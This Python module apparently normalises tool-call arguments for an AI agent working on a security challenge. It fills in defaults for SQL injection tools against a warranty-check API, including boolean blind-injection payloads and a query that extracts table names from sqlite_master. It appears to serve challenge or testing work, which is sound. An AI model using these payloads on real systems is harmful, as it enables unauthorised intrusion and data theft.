"""Compatibility adapter for model/provider argument naming drift."""
ALIASES = {"target_url":"url", "target":"url", "session":"session_name", "session_id":"session_name", "data":"body", "form_data":"form", "params":"query", "cookie":"headers.Cookie", "artifact":"path", "artifact_path":"path"}

def adapt_arguments(tool: str, arguments: dict, challenge: object | None = None) -> dict:
    out = dict(arguments or {})
    for old, new in ALIASES.items():
        if old in out and new not in out:
            value = out.pop(old)
            if new == "headers.Cookie":
                headers = dict(out.get("headers") or {}); headers["Cookie"] = value; out["headers"] = headers
            else: out[new] = value
    if tool == "http_extract" and "url" in out and "path" not in out:
        out["url"] = out["url"]
    if tool in {"sql_injection_probe", "sql_boolean_compare", "sql_union_probe", "oracle_probe_matrix", "boolean_config_extract"} and challenge is not None:
        target = str(getattr(challenge, "target_url", "") or "").rstrip("/")
        if target and "/api/warranty/check" not in target:
            target += "/api/warranty/check"
        request = out.get("request") if isinstance(out.get("request"), dict) else {}
        # Normalize older flat RequestSpec payloads before strict schema
        # validation.  Batch tools intentionally expose only the nested
        # request object, but older Codex turns may send both forms.
        for field in ("method", "url", "headers", "json", "form"):
            if field in out:
                request.setdefault(field, out.pop(field))
        request.setdefault("method", "POST")
        request.setdefault("url", target)
        request.setdefault("headers", {"Content-Type": "application/json"})
        request.setdefault("json", {"asset_no": "PC-2026-013", "department": "OPS"})
        out["request"] = request
        out.setdefault("test_field", out.get("parameter") or "department")
        out.setdefault("baseline_value", "OPS")
        out.setdefault("control_fields", {"asset_no": "PC-2026-013"})
        if tool != "boolean_config_extract":
            out.setdefault("true_condition", "' AND 1=1 -- ")
            out.setdefault("false_condition", "' AND 1=2 -- ")
        out.setdefault("oracle", {"json_field": "matched", "true_value": True, "false_value": False})
        if tool == "boolean_config_extract":
            out.setdefault("target_expression", "SELECT group_concat(name) FROM sqlite_master WHERE type='table'")
            out.setdefault("max_requests", 1024)
            out.setdefault("max_length", 64)
        if tool == "oracle_probe_matrix":
            out.setdefault("baseline_field", "asset_no")
            out.setdefault("baseline_exists", "PC-2026-013")
            out.setdefault("baseline_absent", "PC-0000-000")
            out.setdefault("fields", {"asset_no": {"true_value": "PC-2026-013' AND 1=1 -- ", "false_value": "PC-2026-013' AND 1=2 -- "}, "department": {"true_value": "OPS' AND 1=1 -- ", "false_value": "OPS' AND 1=2 -- "}})
    return out
